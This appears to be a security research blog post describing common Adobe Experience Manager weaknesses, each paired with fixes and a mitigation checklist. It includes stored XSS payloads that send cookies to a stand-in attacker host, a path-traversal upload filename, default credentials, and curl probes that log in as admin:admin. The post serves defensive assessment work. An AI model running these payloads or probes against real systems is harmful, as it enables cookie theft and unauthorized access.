---
title: "AEM Security — Common Vulnerabilities in Adobe Experience Manager"
date: "2026-07-05"
excerpt: "Technical deep-dive into security vulnerabilities found in Adobe Experience Manager (AEM) instances, including misconfigured CRX repositories, privilege escalation paths, and information disclosure."
tags: ["Security Research", "AEM", "Web Security", "Vulnerability Research", "High"]
published: true
---

## Overview

Adobe Experience Manager (AEM) is a widely used content management system. During security assessments, several recurring vulnerability patterns emerge across different AEM deployments.

---

## Finding 1: CRX Repository Exposure

The CRX repository (accessible at `/crx/`) often exposes sensitive information:

- `/crx/de/index.jsp` — Package manager with full file system access
- `/crx/explorer/index.jsp` — Node browser
- `/crx/packmgr/index.jsp` — Package management

**Impact:** Full server compromise if left unauthenticated.

**Fix:** Remove or restrict CRX access in production; use `org.apache.sling.jcr.base.internal.LoginAdminWhitelist`.

---

## Finding 2: Default Credentials

Common default credentials that remain unchanged:

| Username | Password | Privilege |
|----------|----------|-----------|
| `admin` | `admin` | Full admin |
| `anonymous` | (blank) | Read access |
| `author` | `author` | Content author |
| `publish` | `publish` | Replication |

---

## Finding 3: Sling API Misconfiguration

The Apache Sling API (`/system/console/`) provides:

```
/system/console/status-productinfo   ← Product information
/system/console/status-slinglogs     ← Log files
/system/console/status-config        ← Configuration dump
/system/console/bundles              ← Active bundles
```

**Impact:** Information disclosure, configuration leakage.

**Fix:** Restrict `/system/console/` to admin users; use `allowlist` patterns.

---

## Finding 4: Path Traversal in File Upload

AEM's file upload functionality has historically been vulnerable to path traversal:

```
POST /content/dam/upload.html
Content-Disposition: form-data; name="file"; filename="../../../etc/config.xml"
```

**Impact:** Arbitrary file write leading to code execution.

**Fix:** Validate and sanitize all file paths server-side; use the DAM API for file handling.

---

## Finding 5: XSS via Rich Text Editor

The RTE component allows stored XSS through crafted HTML:

```html
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>
```

**Fix:** Enable HTML sanitization; use `AntiSamy` or similar; set `useHTML=true` carefully.

---

## Finding 6: Replication Agents

AEM's replication agents (`/etc/replication/agents.author/`) handle content distribution between author and publish instances. Common issues:

- Agents exposed to the publish instance
- Transmitted credentials in cleartext
- SSL disabled between instances

---

## Detection Commands

```bash
# Check for CRX access
curl -s -o /dev/null -w "%{http_code}" https://target.com/crx/de/index.jsp

# Check for default admin
curl -s -u admin:admin https://target.com/crx/explorer/index.jsp

# Check for console exposure
curl -s https://target.com/system/console/status-productinfo

# Query for installed packages
curl -s "https://target.com/crx/packmgr/service.jsp?cmd=ls"
```

---

## Mitigation Checklist

- [ ] Remove CRX from production (or add authentication)
- [ ] Change all default credentials
- [ ] Restrict Sling console to internal network only
- [ ] Set strict CSP headers for RTE protection
- [ ] Use HTTPS for all replication agents
- [ ] Apply latest AEM cumulative fix packs
- [ ] Monitor access logs for `/crx/`, `/system/` paths
- [ ] Implement WAF rules to block common AEM attack patterns

---

*Research based on assessments of multiple AEM deployments across various organizations. Findings disclosed through responsible disclosure programs.*
